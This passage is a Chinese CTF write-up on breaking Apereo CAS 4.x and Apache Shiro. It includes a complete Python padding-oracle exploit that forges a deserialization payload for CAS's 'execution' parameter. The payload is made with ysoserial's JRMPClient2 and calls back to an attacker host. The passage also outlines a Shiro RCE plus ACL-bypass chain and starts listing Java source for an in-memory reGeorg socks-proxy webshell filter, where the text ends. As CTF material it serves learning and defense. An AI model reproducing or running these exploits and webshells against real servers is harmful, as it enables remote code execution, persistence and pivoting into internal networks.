## Login Me - cas 4.x excution rce（黑盒）
8.1 更新：开源一个之前写的[execution生成工具](https://github.com/cL0und/cas4.x-execution-rce)，支持不出网回显，支持4.x低版本默认密钥的payload生成，支持4.x低版本非默认密钥的padding
oracle攻击，支持4.x高版本已知密钥后的payload生成。
详细的漏洞分析可以参考[Apereo CAS 4.X
execution参数反序列化漏洞分析](https://xz.aliyun.com/t/7032)这里不在赘述。文章提到了，前后两个版本区间的encode方法是不一样。
在cas4.x-cas.4.1.6中的加密伪代码如下
    payload = gzip(Java Serialized data)
    body = aes128_cbc_encode(key, iv, payload))
    header = '\x00\x00\x00\x22\x00\x00\x00\x10'+iv+'\x00\x00\x00\x06'+'aes128'
    excution = uuid + b64encode(header + body)
CAS 4.1.7 ～ 4.2.X的加密伪代码如下
    cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))
    data = b64encode(cipher)
    jwsToken = jws.sign(data, jws_key, algorithm=‘HS512’)
    excution = uuid + b64encode(jwsToken)
因为encode的变化excution是不一样的亦可作为判断版本的指纹。  
cas4.x-cas.4.1.6之前特征：execution base64解码出来以\x00\x00\x00\x22\x00\x00\x00\x10开头。  
4.1.7之后特征：execution两次base64解码出来不是乱码而是jws格式（header.body.sign）的字符串。  
解密题目的execution不难发现，环境是4.x-4.1.6(题目没有换ui前端也可以直接看到版本信息)。此外看到，前后两个版本的encode的方式唯一的差异是4.1.7之后execution的需要进行加密签名，联系到它使用的是aes/cbc说到这应该很熟悉了吧padding
oracle！
这里padding oracle，仍然需要讲究技巧，直接生成cc链一类的payload进行padding大约需要padding
114组左右数据（题目两小时重启一次，gadget还需要fuzz，这是一个难以完成的任务），但是如果环境能出网的话用jrmp就需要padding
14组数据左右了，这里视环境情况仍然需要跑1h-3h不等，不过通过分析[cve-2018-2628](http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/)之后能够发现jrmp的payload其实可以更短只需要7组，我在同区域的阿里云上多线程跑不到20分钟就有了结果（这也是题目描述Time
is Flag的暗示233333）。
    from jose import jws
    from Crypto.Cipher import AES
    from cStringIO import StringIO
    from multiprocessing.pool import ThreadPool
    import time
    import requests
    import base64
    import zlib
    import uuid
    import binascii
    import json
    import subprocess
    import requests
    import re
    start_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    iv = uuid.uuid4().bytes
    header_mode = '\x00\x00\x00\x22\x00\x00\x00\x10{iv}\x00\x00\x00\x06aes128'
    JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'
    URL= "http://ip:port/login"
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
    cookies = {"JSESSIONID":"ADF6653ED3808BE63B052BCED53494A3"}
    def base64Padding(data):
        missing_padding = 4 - len(data) % 4
        if missing_padding and missing_padding != 4:
            data += '=' * missing_padding
        return data
    def compress(data):
        gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
        data = gzip_compress.compress(data) + gzip_compress.flush()
        return data
    def bitFlippingAttack(fake_value, orgin_value):
        iv = []
        for f, o in zip(fake_value, orgin_value):
            iv.append(chr(ord(f) ^ ord(o)))
        return iv
    def pad_string(payload):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        return pad(payload)
    def send_request(paramsPost,w):
        response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=False)
        return w, response
    def paddingOracle(value):
        fakeiv = list(chr(0)*16)
        intermediary_value_reverse = []
        for i in range(0, 16):
            num = 16
            response_result = []
            for j in range(0, 256-num+1, num):
                jobs = []
                pool = ThreadPool(num)
                for w in range(j, j + num):
                    fakeiv[N-1-i] = chr(w)
                    #print(fakeiv)
                    fake_iv = ''.join(fakeiv)
                    paramsPost = {"execution":"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_" + base64.b64encode(header + body + fake_iv + value),"password":"admin","submit":"LOGIN","_eventId":"submit","lt":"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org","username":"admin"}
                    job = pool.apply_async(send_request, (paramsPost,w))
                    jobs.append(job)
                pool.close()
                pool.join()
                for w in jobs:
                    j_value, response = w.get()
                    #print(response)
                    if response.status_code == 200:
                        print("="*5 + "200" + "="*5)
                        response_result.append(j_value)
            print(response_result)
            if len(response_result) == 1:
                j_value  = response_result[0]
                intermediary_value_reverse.append(chr((i+1) ^ j_value))
                for w in range(0, i+1):
                    try:
                        fakeiv[N-w-1] = chr(ord(intermediary_value_reverse[w]) ^ (i+2))
                    except Exception as e:
                        print(fakeiv, intermediary_value_reverse, w, i+1)
                        print(base64.b64encode(value))
                        print(e)
                        exit()
                print(fakeiv)
            else:
                print(response_result)
                print("Exit Because count of is " + str(len(response_result)))
                exit()
            print("="*5 + "sleep" + "="*5)
            time.sleep(1)
        intermediary_value = intermediary_value_reverse[::-1]
        return intermediary_value
    def pad_string(payload):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        return pad(payload)
    if __name__ == '__main__':
        popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'JRMPClient2', 'your_ip:your_port'],stdout=subprocess.PIPE)
        payload = popen.stdout.read()
        payload = pad_string(compress(payload))
        excution = "input_excution"
        body = base64.b64decode(excution)[34:]
        header = base64.b64decode(excution)[0:34]
        iv = list(header[8:24])
        N=16
        fake_value_arr = re.findall(r'[\s\S]{16}', payload)
        fake_value_arr.reverse()
        value = body[-16:]
        payload_value_arr = [value]
        count = 1
        all_count = len(fake_value_arr)
        print(all_count)
        for i in fake_value_arr:
            intermediary_value = paddingOracle(value)
            print(value, intermediary_value)
            fakeIv = bitFlippingAttack(intermediary_value, i)
            value = ''.join(fakeIv)
            payload_value_arr.append(value)
            print(count, all_count)
            count += 1
        fakeiv = payload_value_arr.pop()
        payload_value_arr.reverse()
        payload = header_mode.format(iv=fakeiv) + ''.join(payload_value_arr)
        print(base64.b64encode(payload))
        end_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        print(start_time,end_time)
        f = open('/tmp/cas.txt', 'w')
        f.write(base64.b64encode(payload))
        f.close()
通过jrmp出来fuzz
gadget也很方便，这里用的是JDK7u21（在自己做的时候发现同一端口请求一次jrmp之后，后面的再一次请求会变得很慢，这里可以选择再跑一个端口出来交替使用）。接下来就是常见的读取数据库连接字符串查用户登陆的操作了，在此不细表。
## Login Me Again - shiro rce && shiro bypass acl（白盒）
这道题，由我和@l3yx合作完成，前半部分shiro不出网rce利用由l3yx负责完成，后半部分shiro bpass acl部分由我负责完成。  
先贴一个当时构思此题时的速记（有删改）：
> 环境：外网一个有shiro
> rce的不出网应用（打包成jar），内网有一个spring+最新版shiro写一个只允许图的上传功能(打包成war)，上传功能需要管理员权限（shiro鉴权）部署在有ajp漏洞的tomcat7上。  
>  攻击思路  
>  1.通过注入有socks5代理功能的webshell代理到内网。  
>  2.找到新的shiro权限绕过方法或者谷歌搜到我之前提交的issue  
>  3.用ajp漏洞包含刚才上传的图片rce  
>
> 利用难点：1.市面上还没有socks5代理功能的无文件webshell，需要选手自己从已有的jsp构造转换成无文件的webshell。2.自己挖越权或者搜到我之前提交的那个越权issue或者用其他办法。3.市面ajp协议的介绍较少，需要选手自己研究如何用ajp协议上传文件。
下面就从利用难点，逐一说明
### 无文件socks5代理
因为这里是shiro，shiro本身也是一个filter，所以内存马最好也搞成filter(优先级最高)，内存马的思路可以看[基于Tomcat无文件Webshell研究](https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA)。至于具体filter的逻辑，改一下reg就好了，下面贴一下leixiao师傅的代码。
    package reGeorg;
    import javax.servlet.*;
    import java.io.IOException;
    public class MemReGeorg implements javax.servlet.Filter{
        private javax.servlet.http.HttpServletRequest request = null;
        private org.apache.catalina.connector.Response response = null;
        private javax.servlet.http.HttpSession session =null;
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        public void destroy() {}
        @Override
        public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
            javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
            javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
            javax.servlet.http.HttpSession session = request.getSession();
            String cmd = request.getHeader("X-CMD");
            if (cmd != null) {
                response.setHeader("X-STATUS", "OK");
                if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        String target = request.getHeader("X-TARGET");
                        int port = Integer.parseInt(request.getHeader("X-PORT"));
                        java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();